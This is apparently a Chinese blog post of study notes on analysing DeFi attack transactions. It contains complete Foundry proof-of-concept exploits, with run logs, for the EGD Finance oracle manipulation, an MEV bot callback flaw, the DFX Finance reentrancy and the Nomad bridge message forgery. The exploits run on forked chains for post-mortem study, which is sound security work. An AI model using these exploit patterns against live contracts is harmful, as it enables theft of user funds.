链上交易安全分析及相关POC编写

PS：本文章参考了Github上的DeFiHackLabs相关文章，链接在<a href="https://github.com/SunWeb3Sec/DeFiHackLabs">这里</a>。写的很好，从中受益良多，真心表示感谢。以下记录了我学习过程中的笔记。

# 1. Warm Up

以`Etherscan`的上实时的交易`0x653a4d3d34f51d3e094da1dce87a084b6e4865abd882963eda04b5da42de7ed8`为例。

这是一个`approve`合约，EtherScan上地址如下:

https://etherscan.io/tx/0x653a4d3d34f51d3e094da1dce87a084b6e4865abd882963eda04b5da42de7ed8

能看到 `OverView`中的`Value,Gas,Burnt`等信息，还能在`Logs`里看到事件的发送,`State`里地址的信息（`Balance`）也在发生变化（矿工和调用者等）。

我们在`phalcon`里搜索，在`Invocation Flow`里，可以看到整个调用流程。可以看到`Sender`、`Call`、`Event`等信息的串联。

再看看`Uniswap`，采用同一个区块交易`0x1cd5ceda7e2b2d8c66f8c5657f27ef6f35f9e557c8d1532aa88665a37130da84`来查看。

Etherscan上指出`Transaction Action:Swap 12,716.454883 USDT For 7,118.742245582778486733 UNDEAD On Uniswap V2`。并通过`Internal Txns`获取合约间的跨合约调用。

但如果用`phalcon`来看，就很优秀，一方面在`Fund Flow`中看到`ERC20`通证的流动，在`Balance Changes`里可以看到各个地址通证的变化情况。

在`Invocation Flow`里，我们不仅可以完整看到调用，还可以进入DebgLine获取结果和反馈，`JSON`部分可以看到函数调用的结果。同时可以通过`Step In/Out`查看函数调用的过程。

同时用一个`DeFi`的例子，`txn`为`0x667cb82d993657f2779507a0262c9ed9098f5a387e8ec754b99f6e1d61d92d0b`。用`phalcon`能很清晰地看出用户添加了USDT的流动性，并铸造了CRV。但这个时候`DebugLine`功能失效了，因为没有开源。

同时查看一个`Compound`的例子，在`Etherscan`上看应该是`Vote`的`Governance`行为。同样`phalcon`能更好地现实内部发生的行为，很有用处。

<hr />

在`DefiHackLab`里进行测试，同时也熟悉一下操作。

```
forge test --contracts ./src/test/Uniswapv2.sol -vvvv
```

发现会很详细的列出具体信息，包括`Gas`、`delegateCall`等信息。

# 2. Price Oracle Manipulation POC

预言机本质上是人为（或机器）实现数据的上链，并通过主动或被动进行喂价。合约还可以通过计算代币储备量之币进行计算。

整理资讯：

1. Transaction ID 交易哈希
2. Attacker Address(EOA) 攻击地址（外部）
3. Attack Contract Address 攻击合约地址
4. Vulnerable Address 漏洞合约地址
5. Total Loss 总损失
6. Reference Links 相关参考链接
7. Post-mortem Links 后期评估报告链接
8. Vulnerable snippet 相关代码片段
9. Audit History 审计历史

建议模板如下：

```solidity

 

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Script.sol";

// @KeyInfo - Total Lost : ~999M US$
// Attacker : 0xcafebabe
// Attack Contract : 0xdeadbeef
// Vulnerable Contract : 0xdeadbeef
// Attack Tx : 0x123456789

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xdeadbeef#code

// @Analysis
// Post-mortem : https://www.google.com/
// Twitter Guy : https://www.google.com/
// Hacking God : https://www.google.com/


contract ExploitScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        
        vm.stopBroadcast();
    }
}
```

采用`EGD Finance`为例，其哈希为`0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3`，发生在`BSC`链上。

分析流向

- 攻击者只调用了一笔 `harvest`
- 连续两个闪电贷，通过利用`calacuteEDGprice`喂价的问题，

所以POC合约如下：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~36K US$
// Event : EGD-Finance Hack
// Analysis via https://explorer.phalcon.xyz/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (EGD Staking Proxy Contract)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (EDG Staking Logic Contract)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// FlashLoan Lending Pool USDT_WBNB : 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE
// FlashLoan Lending Pool EGD_USDT : 0xa361433E409Adac1f87CDF133127585F8a93c67d
// Swap Pancake Router : 0x10ED43C718714eb63d5aA57B78B54704E256024E

// @Analysis
// DefiHackLab : https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc/

IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant USDT_ADDRESS = 0x55d398326f99059fF775485246999027B3197955;
address constant EGD_ADDRESS = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract EGDFinanceAttacker is Test { // EOA Simulation

    function setUp() public {
        vm.createSelectFork("bsc",20245522); // Go back to staking time
        
    }

    function testExploit() public {
        Exploit exploit = new Exploit(); 
        console.log("---  Set-up, stake 100 USDT to EGD Finance ---");
        exploit.stake();
        vm.warp(1659914146); // set timestamp for staking reward
        console.log("---  Staking finished ------------------------");

        console.log("---  Starting hacking ------------------------");
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(USDT_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);

        exploit.harvest();

        console.log("--- Hacking finished  -----------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(USDT_ADDRESS).balanceOf(address(this)), 18);
    }
}

contract Exploit is Test { // Attack Contract
    uint borrowUSDT;
    uint borrowUSDT2;

    function stake() public {
        deal(address(USDT_ADDRESS),address(this),100 ether); // set balance of address of (ERC20) to amount
        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        IERC20(USDT_ADDRESS).approve(EGD_Finance,100 ether);
        IEGD_Finance(EGD_Finance).stake(100 ether);
    }

    function harvest() public {
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve"); // Description
        borrowUSDT = 2000 ether;
        USDT_WBNB_LPPool.swap(borrowUSDT,0,address(this),"0000");
        console.log("Flashloan[1] : FlashLoan Payable success");
        IERC20(USDT_ADDRESS).transfer(msg.sender,IERC20(USDT_ADDRESS).balanceOf(address(this)));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        bool isBorrowUSDT = (keccak256(data) == keccak256("0000"));
        if (isBorrowUSDT){
            console.log("Receiving callback for FlashLoad[1]");
            borrowUSDT2 = IERC20(USDT_ADDRESS).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; //  99.99999925% USDT of EGD_USDT_LPPool reserve To manipulate price
            EGD_USDT_LPPool.swap(0,borrowUSDT2,address(this),"00");
            console.log("FlashLoad[2] payable success");

            console.log("Sweep USDT in pair");
            address[] memory paths = new address[](2);
            paths[0] = EGD_ADDRESS;
            paths[1] = USDT_ADDRESS;
            IERC20(EGD_ADDRESS).approve(address(pancakeRouter),type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(EGD_ADDRESS).balanceOf(address(this)),1,paths,address(this),block.timestamp *2
            );

            IERC20(USDT_ADDRESS).transfer(msg.sender,2010 ether);
        }else{
            console.log("Receiving callback for FlashLoad[2]");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(this)), 18);
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[End] Attacker EGD Balance", IERC20(EGD_ADDRESS).balanceOf(address(this)), 18);
            uint256 swapfee = borrowUSDT2 * 3 / 1000; // Attacker pay 0.3% fee to Pancakeswap
            IERC20(USDT_ADDRESS).transfer(address(EGD_USDT_LPPool), borrowUSDT2 + swapfee);
        }
    }
}

/* -------------------- Interface -------------------- */
interface IEGD_Finance { // Interface needed to interact
    function bond(address invitor) external;
    function stake(uint256 amount) external;
    function calculateAll(address addr) external view returns (uint256);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint256);
}
```

<hr />

# 3. MEV Bot POC

总结一下，就是`MEV BOT`的余额太多，同时没有对`Pair`的身份进行校验。

反编译之后，有

```solidity
function pancakeCall(address varg0, uint256 varg1, uint256 varg2, bytes varg3) public nonPayable { 
    require(msg.data.length - 4 >= 128);
    require(varg0 == varg0);
    require(varg3 <= 0xffffffffffffffff);
    require(4 + varg3 + 31 < msg.data.length);
    require(varg3.length <= 0xffffffffffffffff);
    require(4 + varg3 + varg3.length + 32 <= msg.data.length);
    v0 = new bytes[](varg3.length);
    CALLDATACOPY(v0.data, varg3.data, varg3.length);
    v0[varg3.length] = 0;
    0x10a(v0, varg2, varg1);
}
```

有`varg0 = sender`，也就是发送者, `varg1=amount0`即`pair`中的`token0`，还有`varg2=amount1`即`pair`中的`token1`。（我们在这里只用设置`token0`），因为我们将伪装成`pair`。后面会有`0x10a(v0=varg3,varg2,varg1)`

再看`0x10a`函数：

先根据`amount0`和`amount1`选择`token0`还是`token1`（这里只用`token0`）

`    v5, v6 = address(v3).transfer(address(MEM[varg0.data]), varg1).gas(msg.gas);`此时后还会访问`MEM[varg0.data]`的`swap`函数以及`token1`函数。因为没有具体代码，很难再继续往下推进分析了。

写了一个`POC`示例，但还有很多不足，比如模拟的`EOA`账户不应该直接接受，应该由`Exploit`模拟后转账，但无伤大雅。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~140K US$
// Event : MEV BOT (BNB48)
// Analysis via https://explorer.phalcon.xyz/tx/bsc/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2
// Attacker : 0xee286554f8b315f0560a15b6f085ddad616d0601
// Attack Contract : 0x5cb11ce550a2e6c24ebfc8df86c5757b596e69c1
// Vulnerable Contract : 0x64dd59d6c7f09dc05b472ce5cb961b6e10106e1d (MEV BOT)
// Attack Tx : https://bscscan.com/tx/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2

// @Info
// Involve USDT, WBNB, BUSD, USDC for MEV_BOT

// @Analysis
// DefiHackLab : https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/04_write_your_own_poc/

address constant USDT_ADDRESS = 0x55d398326f99059fF775485246999027B3197955;
address constant WBNB_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BUSD_ADDRESS = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
address constant USDC_ADDRESS = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;

address constant TARGET_MEV = 0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d;

contract MEVBOTAttacker is Test { // EOA Simulation

    function setUp() public {
        vm.createSelectFork("bsc",21297409); // Go back to staking time
    }

    function testExploit() public {
        Exploit exploit = new Exploit();
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(USDT_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker WBNB Balance", IERC20(WBNB_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker BUSD Balance", IERC20(BUSD_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 18);
        console.log("starting exploiting ...");

        exploit.attack();

        console.log("Ending exploiting ...");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(USDT_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker WBNB Balance", IERC20(WBNB_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker BUSD Balance", IERC20(BUSD_ADDRESS).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 18);

    }

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) public {}

}

contract Exploit is Test { // Attack Contract

    address private owner;
    address public token0;
    // address public token1;

    constructor() {
        owner = msg.sender;
        console.log("Exploit Created by %s", owner);
    }

    function attack() public {
        token0 =  USDT_ADDRESS;
        subAttack();
        token0 =  WBNB_ADDRESS;
        subAttack();
        token0 =  BUSD_ADDRESS;
        subAttack();
        token0 =  USDC_ADDRESS;
        subAttack();
    }

    function subAttack() private {
        IBOT(TARGET_MEV).pancakeCall(
            address(this), 
            IERC20(token0).balanceOf(TARGET_MEV),
            0, 
            abi.encodePacked(
                bytes12(0), bytes20(address(owner)), // slot
                bytes32(0), 
                bytes32(0))
        );
    }

    function token1() public returns(address){
        return token0;
    }


}

// interface of MEV
interface IBOT {
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}
```

<hr />

# 4. RugPull Analysisc

主要分析的是`CirculateBUSD`项目的`RugPull`行为。Tx是`0x3475278b4264d4263309020060a1af28d7be02963feaf1a1e97e9830c68834b3`。但今天`phalcon`竟然先宕机了，没想到。

观察调用栈，是在`startTrading`里又调用了`未开源合约`，逆向`decode`分析发现里面通过`if`区分开正常交易和`Rugpull`，属于留的后门！

<hr />

# 5. Reentrancy POC

选用的攻击为发生在`ETH`链上的`DFX Finance`重入攻击，损失达到了400万美元。`tx Hash = 0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7`。 在`etherscan`里，跟踪`ERC20`的日志，可以得出如下结论：

```
1. 攻击合约从其他地址收到了大量通证
2. DFX Finance 似乎收取了手续费
3. 似乎进行了抵押、解压（有质押通证的铸造和销毁）
```

我们详细分析来看，进入`phalcon`

查看调用栈：

1. 攻击合约
   1. dfx-xidr（受害者合约）.viewDeposit 查看存入20万通证所能需要的curve抵押
   2. 闪电贷（中间向多签`0x27e843260c71443b4cc8cb6bf226c3f77b9695af`支付了手续费0.6%）
   3. 在闪电贷回调函数中使用`deposit`进行了存入，对合约来说就相当于已经还款了
   4. 在闪电贷结束后，进行`withdraw`

写一个`POC`示例吧！

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 4M US$
// Event : DFX-Finance Hack
// Analysis via https://explorer.phalcon.xyz/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
// Attacker : 0x14c19962e4a899f29b3dd9ff52ebfb5e4cb9a067
// Attack Contract : 0x6cFa86a352339E766FF1cA119c8C40824f41F22D
// Vulnerable Contract : 0x46161158b1947D9149E066d6d31AF1283b2d377C (Curve Contract)
// Attack Tx : https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7

// @Info
// Reentrance Attack

// @Analysis
// DefiHackLab : https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/06_write_your_own_poc


address constant TARGET_CURVE = 0x46161158b1947D9149E066d6d31AF1283b2d377C;
address constant XIDR_ADDRESS =  0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52;
address constant USDC_ADDRESS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant dfx_xidr_usdc_v2 = 0x46161158b1947D9149E066d6d31AF1283b2d377C;

contract DFXFinanceHack is Test { // EOA Simulation

    function setUp() public {
        vm.createSelectFork("mainnet",15941700); // Go back before hacking time
        console.log("start with block %d",15941700);
    }

    function testExploit() public {
        console.log("start hacking...");
        emit log_named_decimal_uint("[Start] Attacker XIDR Balance", IERC20(XIDR_ADDRESS).balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[Start] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 6);
        Exploit exploit = new Exploit();
        exploit.attack();
        console.log("attacking finished");
        emit log_named_decimal_uint("[End] Attacker XIDR Balance", IERC20(XIDR_ADDRESS).balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[End] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 6);
    }

}

contract Exploit is Test {

    IERC20 xidr = IERC20(XIDR_ADDRESS);
    IERC20 usdc = IERC20(USDC_ADDRESS);
    IERC20 dfx = IERC20(dfx_xidr_usdc_v2);
    ICurve curve = ICurve(TARGET_CURVE);


    address owner;

    constructor() {
        console.log("Exploit Created...");
        owner = msg.sender;
        initToken();
    }

    function initToken() public{
        xidr.approve(address(curve),type(uint256).max);
        usdc.approve(address(curve),type(uint256).max);
        dfx.approve(address(curve),type(uint256).max);
    }

    function attack() public {
        uint[] memory toDeposits = new uint[](2);

        (, toDeposits) = curve.viewDeposit(200000 ether);
        deal(address(xidr), address(this), toDeposits[0] * 8 / 1000);
        deal(address(usdc), address(this), toDeposits[1] * 8 / 1000);
        emit log_named_decimal_uint("[Init] To deposit 200000 us need xidr ", toDeposits[0], 6);
        emit log_named_decimal_uint("[Init] To deposit 200000 us need usdc ", toDeposits[1], 6);
        emit log_named_decimal_uint("[Init] Exploit USDC  Balance", usdc.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[Init] Exploit XIDR  Balance", xidr.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[Init] Exploit USDC  Balance", usdc.balanceOf(address(this)), 6);
        
        curve.flash(address(this), toDeposits[0] * 994 / 1000, toDeposits[1] * 994 / 1000, "1");
        emit log_named_decimal_uint("[Flashed] Exploit Dfx  Balance", dfx.balanceOf(address(this)), 18);
        curve.withdraw(dfx.balanceOf(address(this)),type(uint256).max);
        emit log_named_decimal_uint("[Ended] Exploit XIDR  Balance", xidr.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[End] Exploit USDC  Balance", usdc.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[End] Exploit Dfx Balance", dfx.balanceOf(address(this)), 18);
        xidr.transfer(owner,xidr.balanceOf(address(this)));
        usdc.transfer(owner,usdc.balanceOf(address(this)));
    }

    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external{
        emit log_named_decimal_uint("[Flashed] Exploit XIDR  Balance", xidr.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[Flashed] Exploit USDC  Balance", usdc.balanceOf(address(this)), 6);
        curve.deposit(200000 ether, type(uint256).max);
    }

}
/* -------------------- Interface -------------------- */
interface ICurve {
    function viewDeposit(uint256) external view returns (uint256, uint256[] memory);
    function flash(address,uint256,uint256,bytes calldata) external;
    function deposit(uint256,uint256) external;
    function withdraw(uint256,uint256) external;    
}
```

攻击日志如下：

```
Logs:
  start with block 15941700
  start hacking...
  [Start] Attacker XIDR Balance: 0.000000
  [Start] Attacker USDC Balance: 0.000000
  Exploit Created...
  [Init] To deposit 200000 us need xidr : 2325581395.325581
  [Init] To deposit 200000 us need usdc : 100000.000000
  [Init] Exploit USDC  Balance: 800.000000
  [Init] Exploit XIDR  Balance: 18604651.162604
  [Init] Exploit USDC  Balance: 800.000000
  [Flashed] Exploit XIDR  Balance: 2330232558.116231
  [Flashed] Exploit USDC  Balance: 100200.000000
  [Flashed] Exploit Dfx  Balance: 387023.837944937241748062
  [Ended] Exploit XIDR  Balance: 2287743564.832102
  [End] Exploit USDC  Balance: 100066.263271
  [End] Exploit Dfx Balance: 0.000000000000000000
  attacking finished
  [End] Attacker XIDR Balance: 2287743564.832102
  [End] Attacker USDC Balance: 100066.263271
```

可以看出，在攻击前还需要手动转入通证，否则因为无法垫付税费，就会失败！

<hr />

# 6. Nomad Bridge Hack POC

跨链现在一般采用以下原理：

1. 消息交换（哈希）
2. 锁定-铸造
3. 基于信任 (CEX, Wrapped）
4. 侧链

Nomad项目跨链原理：

```
在Nomad项目中，利用叫做Replica的合约验证Merkle树结构中的消息， 这个合约在各个链上都有部署。项目中的其他合约都依靠这个合约验证输入的消息。一旦消息被验证，它就会被存储在Merkle树中，并生成一个新的承诺树根，并在随后确认、处理。
```

跨链验证智能合约`Replica`相关代码如下：

```solidity
   function process(bytes memory _message) public returns (bool _success) {
       // ensure message was meant for this domain 这里应该使用了Lib
       bytes29 _m = _message.ref(0);
       require(_m.destination() == localDomain, "!destination");
       // ensure message has been proven
       bytes32 _messageHash = _m.keccak();
       require(acceptableRoot(messages[_messageHash]), "!proven"); // 要求该根已被证明
       // check re-entrancy guard
       require(entered == 1, "!reentrant");
       entered = 0; // 手动防止重入
       // update message status as processed
       messages[_messageHash] = LEGACY_STATUS_PROCESSED;
       // call handle function
       IMessageRecipient(_m.recipientAddress()).handle(
           _m.origin(),
           _m.nonce(),
           _m.sender(),
           _m.body().clone()
       );
       // emit process results
       emit Process(_messageHash, true, "");
       // reset re-entrancy guard
       entered = 1;
       // return true
       return true;
   }
```

看上去似乎没有问题，但是`Nomad`又升级了合约：

```solidity
function initialize(
    uint32 _remoteDomain,
    address _updater,
    bytes32 _committedRoot,
    uint256 _optimisticSeconds
) public initializer {
    __NomadBase_initialize(_updater);
    // set storage variables
    entered = 1;
    remoteDomain = _remoteDomain;
    committedRoot = _committedRoot;
    // pre-approve the committed root.
    confirmAt[_committedRoot] = 1;
    _setOptimisticTimeout(_optimisticSeconds);
}
```

在初始化tx（0x99662dacfb4b963479b159fc43c2b4d048562104fe154a4d0c2519ada72e50bf）中，传入的`committedRoot`为`0x0000000000000000000000000000000000000000000000000000000000000000`，所以当我们访问不存在的`messages[_messageHash]`后，`acceptableRoot`对零值的校验为真，因此就能通过。

根据以上原理，可以编写攻击POC:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 190M US$
// Event : Nomad Bridge Hack 
// Analysis via https://explorer.phalcon.xyz/tx/eth/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460
// Attacker : 0xa8c83b1b30291a3a1a118058b5445cc83041cd9d
// Vulnerable Contract : 0x5d94309e5a0090b165fa4181519701637b6daeba (Proxy Contract)
// Vulnerable Contract : 0xb92336759618f55bd0f8313bd843604592e27bd8 (Replica Contract)
// Attack Tx : https://etherscan.io/tx/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460

// @Info
// Reentrance Attack

// @Analysis
// DefiHackLab : https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/07_Analysis_nomad_bridge/

address constant TARGET_NOMAD = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
address constant USDC_ADDRESS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;   
address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
uint32 constant ETHEREUM = 0x657468;   // "eth"
uint32 constant MOONBEAM = 0x6265616d; // "beam"

contract DFXFinanceHack is Test { // EOA Simulation

    function setUp() public {
        vm.createSelectFork("mainnet",15259100); // Go back before hacking time
        console.log("start with block %d",15259100);
    }

    function testExploit() public {
        console.log("start hacking...");
        emit log_named_decimal_uint("[Start] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 6);

        uint256 hackAmount = IERC20(USDC_ADDRESS).balanceOf(ERC20_BRIDGE);
        emit log_named_decimal_uint("[Hacking] Victim USDC Balance", hackAmount, 6);

        IBridge(TARGET_NOMAD).process(generateMsg(address(this),USDC_ADDRESS,hackAmount));

        console.log("finish hacking...");
        emit log_named_decimal_uint("[End] Victim USDC Balance", IERC20(USDC_ADDRESS).balanceOf(TARGET_NOMAD), 6);
        emit log_named_decimal_uint("[End] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 6);
    }

// 任意生成，只要hash不存在就行
    function generateMsg(address to, address token, uint256 amount) internal returns(bytes memory){
        return abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),            // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(to)),        // Recipient of the transfer
           uint256(amount),                    // Amount
           uint256(0)                          // Optional: Token details hash
        );
    }
}


/* -------------------- Interface -------------------- */
interface IBridge {
    function process(bytes memory _message) external returns (bool _success);
}

```

